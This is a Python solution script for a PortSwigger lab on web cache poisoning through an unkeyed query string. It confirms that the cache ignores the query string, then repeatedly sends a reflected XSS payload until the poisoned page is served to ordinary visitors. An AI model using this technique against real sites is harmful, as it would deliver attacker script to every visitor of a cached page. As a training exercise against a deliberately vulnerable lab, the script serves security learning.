"""
Lab 5: Web cache poisoning via an unkeyed query string
https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query
Difficulty: Practitioner

📝 The ENTIRE query string is unkeyed — any parameter you invent gets
ignored by the cache key but still reflected by the origin. Use the
Origin header as a cache buster (a common pattern in this lab) since a
query param can't be used as one when the whole string is unkeyed.
"""

from utils import get_session, cache_status, poison_until_hit, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"

XSS_PARAM = "x"
XSS_PAYLOAD = "'><script>alert(1)</script>"


def run():
    s = get_session()

    note("Confirming the whole query string is unkeyed: changing params")
    note("should still produce a cache HIT if nothing else changed.")
    r1 = s.get(f"{TARGET}/?a=1")
    r2 = s.get(f"{TARGET}/?a=2")
    log(f"r1 X-Cache={cache_status(r1)!r}, r2 X-Cache={cache_status(r2)!r}")

    note("Using Origin header as the cache buster (query params won't work")
    note("here since the whole query string is ignored by the key).")
    buster_headers = {"Origin": "https://cache-buster-12345.example.com"}

    poison_until_hit(
        s, f"{TARGET}/?{XSS_PARAM}={XSS_PAYLOAD}",
        headers=buster_headers,
    )

    note("Re-poison without the Origin buster so the REAL cache (no buster)")
    note("serves the payload to normal visitors.")
    r = poison_until_hit(s, f"{TARGET}/?{XSS_PARAM}={XSS_PAYLOAD}")
    if r:
        log(f"Payload reflected in poisoned response: {'alert(1)' in r.text}")


if __name__ == "__main__":
    run()
